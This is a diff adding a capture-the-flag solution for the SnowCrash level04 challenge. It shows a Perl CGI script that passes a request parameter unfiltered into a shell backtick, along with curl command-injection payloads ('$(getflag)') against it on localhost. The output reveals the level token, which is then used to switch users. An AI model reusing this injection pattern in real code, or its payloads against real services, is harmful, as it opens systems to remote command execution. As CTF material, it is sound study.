@@ -1,0 +1,35 @@
+cat level04.pl
+netstat -lt
+curl  --data 'x=$(getflag)' "localhost:4747"
+
+===========
+
+level04@SnowCrash:~$ ls
+level04.pl
+level04@SnowCrash:~$ cat level04.pl
+#!/usr/bin/perl
+# localhost:4747
+use CGI qw{param};
+print "Content-type: text/html\n\n";
+sub x {
+  $y = $_[0];
+  print `echo $y 2>&1`;
+}
+x(param("x"));
+level04@SnowCrash:~$ netstat -lt
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State
+tcp        0      0 *:4242                  *:*                     LISTEN
+tcp        0      0 localhost:pcrd          *:*                     LISTEN
+tcp6       0      0 [::]:4646               [::]:*                  LISTEN
+tcp6       0      0 [::]:4747               [::]:*                  LISTEN
+tcp6       0      0 [::]:http               [::]:*                  LISTEN
+tcp6       0      0 [::]:4242               [::]:*                  LISTEN
+level04@SnowCrash:~$ curl localhost:4747?x='$(getflag)'
+Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
+level04@SnowCrash:~$ curl  --data 'x=$(getflag)' "localhost:4747"
+Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
+level04@SnowCrash:~$
+level04@SnowCrash:~$ su level05
+Password: /ne2searoevaevoem4ov4ar8ap/
+level05@SnowCrash:~$
